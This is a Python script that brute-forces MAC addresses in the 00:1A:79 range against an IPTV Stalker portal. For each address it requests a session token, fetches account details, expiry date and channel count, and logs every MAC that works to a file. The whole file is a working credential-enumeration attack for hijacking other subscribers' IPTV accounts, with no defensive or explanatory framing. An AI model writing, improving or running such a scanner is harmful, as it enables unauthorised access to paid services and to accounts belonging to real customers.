import requests
import json
import sys
import logging
from datetime import datetime
from urllib.parse import urlparse
from typing import Generator, Dict, Any

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_mac_combinations(prefix: str = "00:1A:79:", start_from: str = None) -> Generator[str, None, None]:
    start, middle, end = 0, 0, 0
    if start_from:
        start_parts = start_from.split(":")
        if len(start_parts) == 3:
            start, middle, end = [int(part, 16) for part in start_parts]
        else:
            logging.error("Invalid start_from format. Expected three hexadecimal parts.")
            sys.exit(1)

    max_hex_value = 256  # Up to FF in hexadecimal
    for i in range(start, max_hex_value):
        for j in range(middle if i == start else 0, max_hex_value):
            for k in range(end if j == middle else 0, max_hex_value):
                yield f"{prefix}{i:02X}:{j:02X}:{k:02X}"

def print_colored(text: str, color_code: str) -> None:
    print(f"{color_code}{text}\033[0m")

def get_token(session: requests.Session, base_url: str, mac: str) -> str:
    url = f"{base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
    session.cookies.update({'mac': mac})
    res = session.get(url, timeout=10, allow_redirects=False)
    res.raise_for_status()
    data = res.json()
    return data['js']['token']

def get_account_info(session: requests.Session, base_url: str, token: str) -> Dict[str, Any]:
    url = f"{base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
    headers = {"Authorization": f"Bearer {token}"}
    res = session.get(url, headers=headers, timeout=10, allow_redirects=False)
    res.raise_for_status()
    return res.json()

def get_genre_info(session: requests.Session, base_url: str, token: str) -> Dict[str, str]:
    url = f"{base_url}/server/load.php?type=itv&action=get_genres&JsHttpRequest=1-xml"
    headers = {"Authorization": f"Bearer {token}"}
    res = session.get(url, headers=headers, timeout=10, allow_redirects=False)
    res.raise_for_status()
    genre_data = res.json()['js']
    return {group['id']: group['title'] for group in genre_data}

def get_channel_count(session: requests.Session, base_url: str, token: str) -> int:
    url = f"{base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
    headers = {"Authorization": f"Bearer {token}"}
    res = session.get(url, headers=headers, timeout=10, allow_redirects=False)
    res.raise_for_status()
    channels_data = res.json()["js"]["data"]
    return len(channels_data)

def main():
    try:
        base_url = input("Enter IPTV link: ")
        parsed_url = urlparse(base_url)
        host = parsed_url.hostname
        port = parsed_url.port or 80
        base_url = f"http://{host}:{port}"

        current = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        user_mac_input = input("Enter a full MAC address to start from or press Enter to start from beginning: ").strip().upper()
        base_mac = "00:1A:79:"
        start_from = user_mac_input.replace(base_mac, "") if user_mac_input.startswith(base_mac) else None

        if user_mac_input and not start_from:
            print_colored("Invalid MAC address format. Please ensure it starts with '00:1A:79:'.", "\033[91m")
            return

        with requests.Session() as s:
            for mac in generate_mac_combinations(prefix=base_mac, start_from=start_from):
                try:
                    token = get_token(s, base_url, mac)
                    account_info = get_account_info(s, base_url, token)
                    genre_info = get_genre_info(s, base_url, token)
                    channel_count = get_channel_count(s, base_url, token)

                    mac = account_info['js']['mac']
                    expiry = account_info['js']['phone']
                    logging.info(f"MAC = {mac}\nExpiry = {expiry}\nChannels = {channel_count}")
                    
                    with open(f"{host}_{current}.txt", "a") as f:
                        f.write(f"{base_url}/c/\nMAC = {mac}\nExpiry = {expiry}\nChannels = {channel_count}\n\n")
                except (requests.exceptions.RequestException, json.decoder.JSONDecodeError) as e:
                    logging.error(f"Error for MAC {mac}: {e}")
    except KeyboardInterrupt:
        logging.warning("Process interrupted by user. Exiting...")
        sys.exit()

if __name__ == "__main__":
    main()
